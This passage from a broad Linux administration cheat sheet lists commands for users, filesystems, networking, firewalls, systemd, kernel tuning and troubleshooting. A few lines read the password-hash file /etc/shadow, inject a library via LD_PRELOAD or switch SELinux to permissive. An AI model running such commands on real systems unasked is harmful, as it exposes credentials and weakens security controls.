- zsh has associative arrays, completion engine, themes (oh-my-zsh, prezto, starship).
- bash is on every Linux by default; zsh needs install on some minimal distros.

#### Common startup file order (login vs interactive)
```
bash (login):      /etc/profile → ~/.bash_profile → ~/.bash_login → ~/.profile (first found)
bash (non-login):  ~/.bashrc
zsh (login):       /etc/zshenv → ~/.zshenv → /etc/zprofile → ~/.zprofile →
                   /etc/zshrc → ~/.zshrc → /etc/zlogin → ~/.zlogin
zsh (non-login):   /etc/zshenv → ~/.zshenv → /etc/zshrc → ~/.zshrc
```

#### History
```
history                         # in-shell history
history | grep ssh
!!                              # repeat last command
!$                              # last arg of last command
!<n>                            # command number n
Ctrl-R                          # reverse-i-search
history -d <offset>             # remove an entry
HISTSIZE / HISTFILE / HISTCONTROL   # env knobs
```

#### Line-editor keys (readline / zle)
```
Ctrl-a / Ctrl-e            move to start / end
Ctrl-u / Ctrl-k            kill to start / end of line
Ctrl-w                     delete word backwards
Alt-d                      delete word forward
Ctrl-y                     yank (paste)
Ctrl-l                     clear screen
Ctrl-r                     reverse search
Alt-.                      insert last arg of previous command
```

#### Shell-script must-knows
- Covered in §31. Key points: `set -euo pipefail`, `trap`, `getopts`, `${var:-default}`, process substitution `<(cmd)` and `>(cmd)`.

### 45.6 Environment, PATH, libraries

```
env                              # all env vars
printenv PATH                    # just PATH
export KEY=value                 # set for this shell + children
unset KEY
echo $$                          # current shell's pid
echo $BASHPID $PPID $UID $EUID $HOSTNAME $OSTYPE
echo $PATH | tr ':' '\n'
which cmd                        # first match in PATH
type cmd                         # shell's view (alias? function? binary?)
command -v cmd
whereis cmd                      # bin + man + source

LD_LIBRARY_PATH=/opt/mylibs:$LD_LIBRARY_PATH  cmd    # override library path for cmd
LD_PRELOAD=/opt/shim.so cmd                         # inject a shim library first
ldd /path/bin                    # resolved shared-lib paths
ldconfig -p | grep libssl        # cache of registered libraries
strings /etc/ld.so.cache | head  # internal
echo "/opt/mylibs" | sudo tee /etc/ld.so.conf.d/my.conf
sudo ldconfig                    # rebuild cache
```

### 45.7 Users, groups, PAM

```
cat /etc/passwd                  # users (name:x:uid:gid:gecos:home:shell)
cat /etc/shadow                  # hashed passwords (root-only)
cat /etc/group                   # groups
cat /etc/gshadow
getent passwd alice              # resolves via nsswitch (may hit LDAP/AD)
getent group sudo
id alice
id -u alice
id -gn
groups alice
su - alice                       # login shell as alice
su -c 'cmd' alice                # run one cmd
useradd -m -s /bin/bash alice
userdel -r alice                 # -r removes home + mail
usermod -aG docker,sudo alice    # add to groups (-a appends)
passwd alice                     # change password
passwd -l alice                  # lock account (prepends ! to shadow hash)
passwd -u alice                  # unlock
chage -l alice                   # password-age info
chage -E 2026-12-31 alice        # account expires
groupadd dev
groupmod -n newname oldname
gpasswd -a alice dev             # add alice to dev group
vipw / vigr                      # safely edit /etc/passwd / /etc/group
```

PAM (Pluggable Auth Modules):
```
/etc/pam.d/                      # per-service rules
/etc/pam.d/sshd                  # ssh auth
/etc/pam.d/common-auth           # Debian-style include
/etc/pam.d/system-auth           # Red Hat-style
faillog -u alice                 # failed login count
pam_tally2 --user=alice --reset  # (older) reset
pam_faillock --user=alice --reset
```

### 45.8 Cron + systemd timers

See §13 for cron basics; a few extras:

```
/etc/cron.allow / /etc/cron.deny    # who can crontab
anacron                             # runs missed jobs after boot (for laptops)
/etc/anacrontab
# Safer than cron for one-shot: at(1)
at 2am tomorrow <<'EOF'
/usr/local/bin/backup.sh
EOF
at -l                               # queued jobs
atq                                 # same
atrm <id>                           # cancel
```

systemd timers (§28) vs cron:
- Timers log to journald; cron sends email on stderr.
- Timers can depend on other units (`Wants=`, `Requires=`).
- Timers survive time jumps (NTP resync) better.
- `OnBootSec=`, `OnUnitActiveSec=` allow relative schedules.

### 45.9 Logs — syslog / rsyslog / journald

```
journalctl                               # all
journalctl -b                            # current boot only
journalctl -b -1                         # previous boot
journalctl -k                            # kernel (dmesg)
journalctl -u nginx.service -f
journalctl -p warning..err               # priority range
journalctl --since "1 hour ago"
journalctl --until "2025-04-20 08:00"
journalctl _UID=1000
journalctl _PID=1234
journalctl _SYSTEMD_UNIT=cron.service
journalctl --disk-usage
journalctl --vacuum-time=2weeks
journalctl --vacuum-size=500M

# Classic syslog files (if rsyslog installed):
/var/log/syslog                          # Debian/Ubuntu
/var/log/messages                        # RHEL/Fedora
/var/log/auth.log | /var/log/secure
/var/log/kern.log
/var/log/dmesg                           # snapshot; dmesg(1) reads kernel ring buffer
/var/log/dpkg.log | /var/log/rpm.log     # package actions
/var/log/apt/                            # apt history
/var/log/nginx/, /var/log/apache2/       # web servers

# Config:
/etc/rsyslog.conf  /etc/rsyslog.d/
/etc/logrotate.conf  /etc/logrotate.d/
```

### 45.10 Filesystems — deep

```
# Inspect
lsblk -f                         # tree: block devices + FS + UUID + mountpoint
blkid                            # UUIDs + types
findmnt                          # mount tree
mount | column -t                # mounted fs
cat /proc/mounts                 # authoritative mount list
df -h                            # space
df -i                            # inodes
du -h --max-depth=1
```

#### ext4 (default on many distros)
```
sudo mkfs.ext4 /dev/sdXN
sudo mkfs.ext4 -L mylabel -b 4096 /dev/sdXN
sudo tune2fs -l /dev/sdXN        # inspect
sudo tune2fs -c 0 /dev/sdXN      # disable periodic fsck
sudo tune2fs -L label /dev/sdXN
sudo e2label /dev/sdXN mylabel
sudo resize2fs /dev/sdXN         # after partition resize
sudo e2fsck -f /dev/sdXN         # force fsck
sudo dumpe2fs /dev/sdXN | less
```

#### xfs (RHEL default)
```
sudo mkfs.xfs /dev/sdXN
sudo xfs_info /dev/sdXN
sudo xfs_repair /dev/sdXN
sudo xfs_growfs /mnt             # grow online
sudo xfs_fsr                     # defragmenter
```

#### btrfs
```
sudo mkfs.btrfs /dev/sdXN
sudo btrfs filesystem show
sudo btrfs filesystem df /mnt
sudo btrfs subvolume list /
sudo btrfs subvolume create /mnt/sub
sudo btrfs subvolume snapshot -r /mnt/sub /mnt/sub-snap     # read-only snapshot
sudo btrfs subvolume delete /mnt/sub-snap
sudo btrfs send /mnt/sub-snap | ssh user@remote btrfs receive /backup
sudo btrfs balance start /mnt
sudo btrfs scrub start /mnt
```

#### zfs (on zfsonlinux)
```
zpool list / zpool status
zpool create tank mirror /dev/sdX /dev/sdY
zfs list
zfs create tank/fs1
zfs snapshot tank/fs1@today
zfs rollback tank/fs1@today
zfs send tank/fs1@today | ssh host zfs receive tank/fs1
```

#### tmpfs / overlayfs
```
sudo mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk
# overlayfs — used by Docker/LXC:
sudo mount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged
```

#### /etc/fstab entries
```
# <dev/UUID/LABEL>  <mountpoint>  <fstype>  <options>           <dump> <pass>
UUID=abc123         /            ext4      defaults,noatime    0       1
LABEL=DATA          /data        ext4      defaults,noatime    0       2
tmpfs               /tmp         tmpfs     defaults,size=2G    0       0
//server/share      /mnt/smb     cifs      credentials=/root/.smbcred,uid=1000,gid=1000 0 0
server:/export      /mnt/nfs     nfs       defaults,soft,timeo=60 0 0
```

Handy mount options: `noatime` (perf), `nofail` (don't block boot if missing), `ro`, `user` (allow user mount), `_netdev` (wait for network).

### 45.11 LVM

```
# pv → vg → lv hierarchy
sudo pvcreate /dev/sdb1
sudo vgcreate datavg /dev/sdb1
sudo vgextend datavg /dev/sdc1
sudo lvcreate -L 50G -n home datavg
sudo lvcreate -l 100%FREE -n data datavg
sudo mkfs.ext4 /dev/datavg/home
sudo lvextend -L +20G /dev/datavg/home
sudo resize2fs /dev/datavg/home       # grow FS (xfs_growfs for xfs)
sudo lvreduce -L -10G /dev/datavg/home   # requires umount + fsck + resize2fs first
sudo lvremove /dev/datavg/home
# Snapshots:
sudo lvcreate -L 5G -s -n home_snap /dev/datavg/home
sudo lvremove /dev/datavg/home_snap
# Inspect:
pvs; vgs; lvs; pvdisplay; vgdisplay; lvdisplay
```

### 45.12 Encryption — LUKS, dm-crypt, fscrypt

```
# LUKS (full-disk encryption)
sudo cryptsetup luksFormat /dev/sdXN
sudo cryptsetup luksOpen /dev/sdXN mycrypt     # device appears as /dev/mapper/mycrypt
sudo mkfs.ext4 /dev/mapper/mycrypt
sudo cryptsetup luksClose mycrypt
sudo cryptsetup luksAddKey /dev/sdXN           # add another passphrase
sudo cryptsetup luksRemoveKey /dev/sdXN
sudo cryptsetup luksHeaderBackup /dev/sdXN --header-backup-file hdr.bin
sudo cryptsetup luksDump /dev/sdXN              # slot info

# /etc/crypttab entry (auto-open on boot):
#   <name>  <device>   <key>   <options>
mycrypt     UUID=abc   none    luks,discard

# fscrypt (per-directory, e.g. home)
fscrypt status
fscrypt setup
fscrypt encrypt ~/secret
fscrypt unlock ~/secret
```

### 45.13 Networking stacks

Modern Linux has several stacks that mostly don't talk to each other:

#### NetworkManager (Kali/Ubuntu-GUI/Fedora default)
```
nmcli connection show
nmcli device status
nmcli connection up id "MyWifi"
nmcli connection down id "MyWifi"
nmcli device wifi list
nmcli device wifi connect "SSID" password "pass"
nmcli connection modify "MyWifi" 802-1x.password-raw ...
nmcli connection add type ethernet con-name wired ifname eth0 ipv4.method manual ipv4.addresses 192.168.1.10/24 ipv4.gateway 192.168.1.1 ipv4.dns 1.1.1.1
# GUI: nm-connection-editor
```

#### systemd-networkd (minimal / server)
```
/etc/systemd/network/20-wired.network
---
[Match]
Name=eth0

[Network]
DHCP=yes
---
sudo systemctl enable --now systemd-networkd
networkctl status
```

#### netplan (Ubuntu server >= 18.04)
```
/etc/netplan/01-netcfg.yaml
---
network:
  version: 2
  renderer: networkd              # or: NetworkManager
  ethernets:
    eth0:
      dhcp4: yes
---
sudo netplan apply
sudo netplan try                 # rollback in 2 min if no confirm
```

#### ifupdown (classic Debian)
```
/etc/network/interfaces
---
auto eth0
iface eth0 inet dhcp
---
sudo ifup eth0 / sudo ifdown eth0
```

#### Basic `ip` (iproute2) commands
```
ip addr
ip -br -c a
ip route
ip route add default via 192.168.1.1
ip link set eth0 up / down
ip neigh                         # ARP/NDP cache
ip -s link                       # stats
ip -6 addr
ip netns add mynet               # network namespace
ip link add veth0 type veth peer name veth1
```

#### DNS resolution
- Older: /etc/resolv.conf is read directly.
- systemd-resolved: a stub listens on 127.0.0.53; /etc/resolv.conf → stub.
- NetworkManager may manage /etc/resolv.conf via its own logic.
- Check: `resolvectl status` or `systemd-resolve --status`.

#### Hosts file / nsswitch
```
/etc/hosts                       # static mappings
/etc/hostname
/etc/nsswitch.conf               # lookup order (files, dns, mdns, ldap, wins, …)
/etc/resolv.conf                 # nameservers + search domains
```

### 45.14 Firewalls

Multiple layers/options — pick one per host:

#### nftables (modern kernel filter)
```
sudo nft list ruleset
sudo nft add table inet myfilter
sudo nft 'add chain inet myfilter input { type filter hook input priority 0; policy drop; }'
sudo nft 'add rule inet myfilter input ct state established,related accept'
sudo nft 'add rule inet myfilter input iif lo accept'
sudo nft 'add rule inet myfilter input tcp dport 22 accept'
sudo nft flush ruleset
# Persist:
sudo nft list ruleset > /etc/nftables.conf
sudo systemctl enable --now nftables.service
```

#### iptables (legacy)
```
sudo iptables -L -n -v
sudo iptables -S
sudo iptables -P INPUT DROP      # default policy
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables-save > /etc/iptables.rules
sudo iptables-restore < /etc/iptables.rules
# ipset for large IP lists:
sudo ipset create blacklist hash:ip
sudo ipset add blacklist 1.2.3.4
sudo iptables -A INPUT -m set --match-set blacklist src -j DROP
```

#### ufw (uncomplicated firewall) — front-end for iptables/nftables
```
sudo ufw enable / disable / reset / reload
sudo ufw status verbose
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow from 192.168.1.0/24 to any port 3306
sudo ufw delete allow 3306
sudo ufw logging on
```

#### firewalld (RHEL/Fedora default) — zone-based front-end
```
sudo firewall-cmd --state
sudo firewall-cmd --get-zones
sudo firewall-cmd --zone=public --list-all
sudo firewall-cmd --zone=public --add-service=http --permanent
sudo firewall-cmd --zone=public --add-port=8080/tcp --permanent
sudo firewall-cmd --reload
```

### 45.15 Kernel modules deep

```
lsmod
modinfo <mod>
modprobe <mod> param1=1 param2=foo
modprobe -c | grep <mod>                  # runtime config
# Blacklist (prevent auto-load):
echo 'blacklist nouveau' | sudo tee /etc/modprobe.d/blacklist-nouveau.conf
sudo update-initramfs -u                  # Debian
sudo dracut -f                            # Fedora/RHEL
# Load at boot:
echo 'my_mod' | sudo tee /etc/modules-load.d/my_mod.conf
# Find the module for a device:
lspci -k | grep -A2 -i network
# Build a dkms module:
sudo dkms install -m <name> -v <version>
```

### 45.16 IPC (signals, pipes, sockets, shared memory)

#### Signals
```
kill -l                          # list signals
kill -TERM <pid>    (15)         # graceful
kill -KILL <pid>    (9)          # immediate, uncatchable
kill -HUP <pid>     (1)          # usually "reload config"
kill -USR1 <pid>    (10)         # app-defined
kill -INT <pid>     (2)          # like Ctrl-C
kill -STOP <pid>    (19)         # suspend
kill -CONT <pid>    (18)         # resume
# Signals in scripts:
trap 'echo got INT; exit 1' INT
trap 'cleanup' EXIT ERR
```

#### Pipes / fifos
```
cmd1 | cmd2                      # stdout of 1 → stdin of 2
mkfifo /tmp/myfifo               # named pipe
# Read/write FIFOs (blocking):
cat < /tmp/myfifo &
echo "hi" > /tmp/myfifo
```

#### Unix-domain sockets
```
ss -xl                           # list listening unix sockets
ls -la /var/run /tmp /run/user/1000
# Connect with nc:
nc -U /var/run/foo.sock
# Send an HTTP request via curl over unix socket:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

#### Shared memory / semaphores (SysV)
```
ipcs                             # lists shm, msg, sem
ipcs -m                          # only shared memory
ipcrm -m <shmid>                 # remove shm segment
ipcrm -M <key>
# POSIX shm lives under /dev/shm
ls /dev/shm
```

### 45.17 Time, NTP, locale

```
date
date -u
date -d "next friday"
date +%s                         # unix timestamp
date -d @1700000000              # from unix ts
timedatectl status               # time / timezone / NTP sync
sudo timedatectl set-timezone Europe/Paris
sudo timedatectl set-ntp true
chronyc tracking                 # chrony client status
chronyc sources                  # NTP sources
sudo systemctl restart chronyd   # or systemd-timesyncd
hwclock --show                   # hardware/RTC clock
sudo hwclock --hctosys           # load RTC → system
sudo hwclock --systohc           # save system → RTC

# Locale
locale                           # current
locale -a                        # installed
sudo dpkg-reconfigure locales    # Debian
sudo locale-gen en_US.UTF-8
export LC_ALL=en_US.UTF-8
export LANG=en_US.UTF-8
```

### 45.18 Manual pages & docs

```
man <topic>
man 1 ls                         # section 1 (user cmds)
man 5 passwd                     # section 5 (file formats) → /etc/passwd
man 8 iptables                   # section 8 (admin cmds)
man -k keyword                   # apropos
man -f cmd                       # whatis
info <topic>                     # GNU info pages (lots of GNU utils)
help <shell-builtin>             # bash builtin help: `help cd`
<cmd> --help
# Man-page sections:
1 user cmds     2 syscalls     3 library calls
4 devices       5 file formats 6 games
7 misc          8 admin cmds   9 kernel routines
```

### 45.19 Package managers across distros

| Distro family | Mgr    | Install | Remove | Search | Update all |
|---------------|--------|---------|--------|--------|------------|
| Debian / Kali / Ubuntu | apt | `apt install x` | `apt remove x` | `apt search x` | `apt update && apt upgrade` |
| RHEL / Fedora / CentOS | dnf (newer) / yum | `dnf install x` | `dnf remove x` | `dnf search x` | `dnf upgrade` |
| Arch / Manjaro | pacman | `pacman -S x` | `pacman -Rns x` | `pacman -Ss x` | `pacman -Syu` |
| openSUSE | zypper | `zypper install x` | `zypper remove x` | `zypper search x` | `zypper update` |
| Alpine | apk | `apk add x` | `apk del x` | `apk search x` | `apk upgrade` |
| NixOS | nix | `nix-env -iA nixpkgs.x` | `nix-env -e x` | `nix search x` | `nixos-rebuild switch --upgrade` |
| Gentoo | emerge | `emerge x` | `emerge -C x` | `emerge -s x` | `emerge -uDN @world` |
| Void | xbps | `xbps-install x` | `xbps-remove x` | `xbps-query -Rs x` | `xbps-install -Syu` |

Cross-distro userland:
- **Flatpak** — `flatpak install flathub org.mozilla.firefox`
- **Snap** — `snap install firefox`
- **AppImage** — chmod +x file.AppImage; run directly
- **pipx** — isolated Python CLI tools: `pipx install black`
- **cargo install x** — Rust binaries (to ~/.cargo/bin)
- **go install github.com/user/repo@latest** — Go binaries (to ~/go/bin)
- **npm i -g x** — global Node (goes to npm prefix)
- **bun** — `bun install -g x`
- **brew on Linux** — Homebrew (`/home/linuxbrew/.linuxbrew/bin`)

### 45.20 Editors

#### vi / vim (everywhere)
```
Modes:  Normal (esc) | Insert (i/a/o) | Visual (v) | Command (:)
:w   save       :q   quit       :q!  quit without save    :wq / ZZ  save+quit
i insert   a append   o new line below   O new line above
h j k l  ← ↓ ↑ →
w/b   next/prev word         e   end of word
0 / ^ / $    start / first-non-ws / end of line
gg / G       first / last line
Ctrl-d / Ctrl-u    half-page down / up
:n          jump to line n
/foo        search forward, ?foo backward,  n / N   next/prev match
dw          delete word       dd  delete line      5dd   delete 5 lines
yy          yank line,  p paste after  P paste before
u           undo, Ctrl-r redo
.           repeat last change
:%s/foo/bar/g           global replace
:s/foo/bar/g            on current line
:noh                    clear search highlight
:sp file / :vsp file    split window (horizontal/vertical)
Ctrl-w + hjkl           move between splits
:e path                 open file
:!ls                    run shell cmd
:set nu / :set nonu     line numbers
:set paste              disable auto-indent when pasting
gx  (netrw)             open URL
gf                      go to file under cursor
```

#### nano (friendly)
Keys shown at bottom. `Ctrl-O` save, `Ctrl-X` exit, `Ctrl-W` search, `Ctrl-K` cut line, `Ctrl-U` paste.

#### Emacs (briefly)
```
C-x C-s   save     C-x C-c   exit     C-x k   kill buffer
C-g       abort    M-x       run cmd by name
C-s / C-r search forward/backward
C-k kill to end of line  C-y yank
C-x 2 / C-x 3   split horizontal / vertical
C-x o           other window
M-x term        shell
```

#### micro / helm / kakoune / neovim — modern alternatives
All intuitive; `micro` is notable for "works like a GUI editor without surprises" (Ctrl-S saves etc.).

### 45.21 Distributions — differences worth remembering

- **Debian** — stable, mature, 2-year release cycle. `apt`. `/etc/network/interfaces`.
- **Ubuntu** — Debian fork. Snap by default. `netplan` on server.
- **Kali** — Debian-rolling fork with pentest metapackages.
- **Raspberry Pi OS** — Debian for ARM.
- **Fedora** — bleeding-edge, 6-month cycle. `dnf`. SELinux on.
- **RHEL** — Red Hat's LTS enterprise. Same package style as Fedora, older. Paid support.
- **CentOS Stream / Rocky / Alma** — RHEL rebuilds / upstream.
- **openSUSE Leap** — stable. `zypper`. `SELinux` optional (AppArmor by default).
- **Arch** — rolling, DIY. `pacman`. systemd. Excellent wiki.
- **Manjaro** — Arch with training wheels + installer.
- **Alpine** — tiny, musl+busybox, OpenRC. `apk`. Popular in Docker images.
- **NixOS** — declarative; entire system described in `/etc/nixos/configuration.nix`.
- **Void** — rolling, runit, musl or glibc. `xbps`.
- **Gentoo** — source-based, USE flags, `emerge`.
- **Slackware** — oldest still alive. No dependency resolution in base pkg mgr.

### 45.22 Container runtimes / orchestration

- **runc** — the low-level OCI runtime (spawns containers).
- **crun** — faster runc alternative in C.
- **containerd** — Docker's container engine (CRI-compatible).
- **CRI-O** — Kubernetes-focused container engine.
- **Docker** — user-facing tooling + containerd + runc.
- **Podman** — daemonless alternative to Docker (CLI-compatible).
- **Buildah** — build OCI images without a daemon.
- **Skopeo** — move/inspect container images between registries.
- **Kubernetes** — orchestrator. `kubectl`.
- **k3s / k0s / microk8s** — light Kubernetes distros.
- **Docker Swarm** — simple cluster mode (docker compose at cluster level).
- **LXC / LXD** — system containers (more VM-like).
- **systemd-nspawn** — namespace-based light containers shipped with systemd.

Handy kubectl one-liners:
```
kubectl get pods -A
kubectl get nodes -o wide
kubectl describe pod <p>
kubectl logs -f <p>
kubectl exec -it <p> -- sh
kubectl port-forward svc/<svc> 8080:80
kubectl apply -f manifest.yaml
kubectl delete -f manifest.yaml
kubectl top pods                         # requires metrics-server
kubectl rollout restart deployment/<d>
kubectl rollout undo deployment/<d>
kubectl edit deployment/<d>
kubectl config get-contexts
kubectl config use-context <ctx>
```

### 45.23 Advanced systemd

Beyond §28:

#### Socket activation
```
# /etc/systemd/system/myapp.socket
[Socket]
ListenStream=8080
Accept=false

[Install]
WantedBy=sockets.target

# /etc/systemd/system/myapp.service
[Service]
ExecStart=/usr/bin/myapp
```

The socket is owned by systemd; the service is started only when a client connects, saving idle memory.

#### Path units
```
# Run a service when a file changes
[Path]
PathModified=/etc/foo.conf
Unit=reload-foo.service
```

#### Slices / resource control
```
# /etc/systemd/system/myapp.service
[Service]
Slice=mygroup.slice
CPUQuota=50%
MemoryMax=512M
IOWeight=50
TasksMax=100
```

#### Targets worth knowing
```
default.target                  → graphical.target (or multi-user)
multi-user.target               → non-graphical login
graphical.target                → GUI
rescue.target                   → single-user maintenance
emergency.target                → absolute minimum (root shell, / read-only)
hibernate.target / suspend.target / poweroff.target / reboot.target
```

Switch at runtime: `sudo systemctl isolate multi-user.target`.

### 45.24 Kernel knobs (sysctl menu)

Most-tuned keys:
```
# Networking
net.core.somaxconn = 4096                    # listen backlog
net.core.netdev_max_backlog = 16384
net.core.rmem_max = 16777216                 # max socket recv buf
net.core.wmem_max = 16777216
net.ipv4.tcp_fastopen = 3                    # 1 client, 2 server, 3 both
net.ipv4.tcp_mtu_probing = 1
net.ipv4.tcp_keepalive_time = 300
net.ipv4.ip_forward = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv6.conf.all.forwarding = 1

# Memory / VM
vm.swappiness = 10                           # 0-100: willingness to swap
vm.dirty_ratio = 10
vm.dirty_background_ratio = 5
vm.overcommit_memory = 1
vm.vfs_cache_pressure = 50

# Filesystem
fs.file-max = 1048576                        # system-wide open files
fs.inotify.max_user_watches = 524288

# Kernel
kernel.pid_max = 4194304
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.perf_event_paranoid = 2
kernel.yama.ptrace_scope = 1                 # harden ptrace

# Apply / inspect
sysctl -a | less
sudo sysctl -w key=value                     # runtime only
# Persist:
/etc/sysctl.d/99-custom.conf
sudo sysctl --system                         # reload all /etc/sysctl*.conf files
```

### 45.25 Hardware — CPU governor, power, thermals

```
# CPU frequency scaling
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
sudo cpupower frequency-info
sudo cpupower frequency-set -g performance   # or: powersave, schedutil, ondemand
sudo cpufreq-set -c 0 -g performance         # (cpufrequtils)
# Tool to see per-CPU current MHz:
watch -n1 "grep MHz /proc/cpuinfo"
# Disable SMT/HT:
echo off | sudo tee /sys/devices/system/cpu/smt/control

# Battery (laptops)
cat /sys/class/power_supply/BAT0/capacity
cat /sys/class/power_supply/BAT0/status      # Charging / Discharging / Full
cat /sys/class/power_supply/BAT0/energy_full
upower -d                                    # full report
acpi -b                                      # simple status
tlp-stat                                     # TLP power-saver
# Laptop mode tools:
sudo apt install tlp tlp-rdw
sudo tlp start

# Temps
sensors                                      # lm-sensors
sudo sensors-detect                          # first-time setup
watch -n1 sensors
# Fan control:
fancontrol (pwmconfig)
thinkfan                                     # ThinkPads

# GPU
nvidia-smi                                   # NVIDIA
radeontop                                    # AMD
intel_gpu_top                                # Intel

# Suspend / hibernate
systemctl suspend
systemctl hibernate
systemctl hybrid-sleep
# Check what wakeup sources are armed:
cat /proc/acpi/wakeup
```

### 45.26 Wayland vs X11 — know the difference

- **X11**: decades-old display server. Tools: `xrandr`, `xdotool`, `xclip`, `wmctrl`, `xprop`. Everything can read everything (security-weak, scripting-friendly).
- **Wayland**: replacement. Tools: `wl-copy`/`wl-paste`, `grim`/`slurp` (Sway), `wtype`, `ydotool`. Security-tight — global keybind tools often need compositor cooperation.

Quick detection:
```
echo $XDG_SESSION_TYPE           # "x11" | "wayland" | "tty"
loginctl show-session $(loginctl | awk '$3 == ENVIRON["USER"] {print $1; exit}') -p Type
```

On Kali XFCE the session is **X11** — so all X-era tools work.

### 45.27 Accessibility / misc

```
# Text-to-speech
espeak "hello"
espeak-ng "hello"
spd-say "hello"
# Screen reader
orca
# Magnifier (XFCE)
xmag
```

### 45.28 Namespaces + cgroups (container-y bits, on bare metal)

```
# namespaces (per-process isolation)
unshare --net --mount --uts --pid --fork /bin/bash   # enter a fresh namespace
nsenter -t <pid> -n /bin/bash                        # enter another pid's netns
ip netns add mynet
ip netns exec mynet ip addr
ip netns list
# cgroups v2 (the default on modern distros)
cat /sys/fs/cgroup/cgroup.controllers
systemd-cgls                                         # tree of cgroups
systemd-cgtop                                        # top-like per-cgroup
# Put process into a scope:
systemd-run --scope --unit=myscope -p CPUQuota=50% /bin/bash
```

### 45.29 SELinux / AppArmor (MAC layer)

```
# AppArmor (Debian/Ubuntu/openSUSE default)
sudo aa-status                               # profiles loaded/enforcing
sudo aa-enforce /etc/apparmor.d/<profile>
sudo aa-complain /etc/apparmor.d/<profile>
sudo aa-disable /etc/apparmor.d/<profile>
sudo aa-logprof                              # interactive tuning
sudo journalctl -k | grep apparmor

# SELinux (Fedora/RHEL/CentOS default)
getenforce                                   # Enforcing / Permissive / Disabled
sudo setenforce 0                            # runtime permissive (for debugging)
sudo setenforce 1
sestatus
ls -Z /etc/passwd                            # file context
ps -eZ                                       # process context
chcon -t httpd_sys_content_t /var/www/foo    # change context
restorecon -Rv /var/www                      # restore default contexts
sudo audit2allow -a                          # suggest policy from AVCs
sudo semanage boolean -l                     # list booleans
sudo setsebool -P httpd_can_network_connect on
```

### 45.30 Commonly-forgotten useful single commands

```
tree -L 2                                    # show dir tree
find / -xdev -newer /etc/fstab 2>/dev/null   # files modified since some reference
time <cmd>                                   # time a command
timeout 10 <cmd>                             # kill after 10s
watch -n1 '<cmd>'                            # re-run every 1s
yes | <cmd>                                  # auto-yes to prompts (careful)
script -a log.txt                            # record a terminal session (ctrl-d to stop)
tee file <<< "content"                       # here-string write
reptyr <pid>                                 # attach a running process to current terminal
ltrace <cmd>                                 # library-call trace
stdbuf -o0 <cmd>                             # disable stdout buffering
unbuffer <cmd>                               # (from expect-tools) same idea
pv <file> | <cmd>                            # progress bar on pipes
column -t                                    # pretty-print tabular data
rename 's/old/new/' *.txt                    # Perl rename (Debian) — NOT util-linux rename
sponge file < file                           # in-place (from moreutils)
sponge file < <(sort file)
ts '%H:%M:%S'                                # prepend timestamps (moreutils)
ts -i '%H:%M:%S' < log                       # incremental
chronic <cmd>                                # only shows output on failure (moreutils)
```

### 45.31 When all else fails

- **`dmesg --follow --human`** — kernel is usually screaming before you notice.
- **`journalctl -p err -xb`** — "errors since this boot, with extra context".
- **`strace -f -e openat <cmd>`** — what files is this process trying to open?
- **`lsof -p <pid>`** — what does this process already have open?
- **`ss -tupn`** — who's listening/connecting on the network?
- **`systemd-analyze blame`** — slow-boot diagnosis: which units took long?
- **`systemd-analyze critical-chain`** — the critical path.
- **`faillog -a`** / **`last`** / **`lastb`** — login history when things look compromised.
- **`rpm -Va`** / **`debsums -c`** — check files against package checksums.
- **Boot into rescue target**: kernel cmdline `systemd.unit=rescue.target` or `emergency.target`.
- **If network is the only way in and it's dead**: console (IPMI / iDRAC / iLO / virtual serial if on a VM).
